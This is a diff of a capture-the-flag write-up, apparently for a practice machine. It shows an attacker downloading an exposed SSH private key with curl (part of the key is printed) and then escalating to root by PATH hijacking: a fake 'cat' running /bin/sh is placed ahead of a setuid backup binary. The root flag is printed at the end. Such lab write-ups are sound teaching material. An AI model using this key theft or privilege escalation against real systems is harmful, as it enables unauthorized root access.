@@ -300,6 +300,7 @@ root@kali:~# curl http://10.10.10.18/mysshkeywithnamemitsos > mitsos_key
                                  Dload  Upload   Total   Spent    Left  Speed
 100  1679  100  1679    0     0  23000      0 --:--:-- --:--:-- --:--:-- 23000
 
+
 root@kali:~# cat mitsos_key 
 -----BEGIN RSA PRIVATE KEY-----
 MIIEpAIBAAKCAQEAqIkk7+JFhRPDbqA0D1ZB4HxS7Nn6GuEruDvTMS1EBZrUMa9r
@@ -388,15 +389,19 @@ By creating a shell file "cat" and add the path at the beginning of $PATH, we ca
 mitsos@LazyClown:~$ pwd
 /home/mitsos
 
+
 mitsos@LazyClown:~$ echo "/bin/sh" > cat
+
 
 mitsos@LazyClown:~$ export PATH=~/:$PATH
 
+
 mitsos@LazyClown:~$ ./backup
-# 
+
 
 # id
 uid=1000(mitsos) gid=1000(mitsos) euid=0(root) egid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lpadmin),111(sambashare),1000(mitsos)
+
 
 # /bin/cat /root/root.txt
 990b142c3cefd46a5e7d61f678d45515
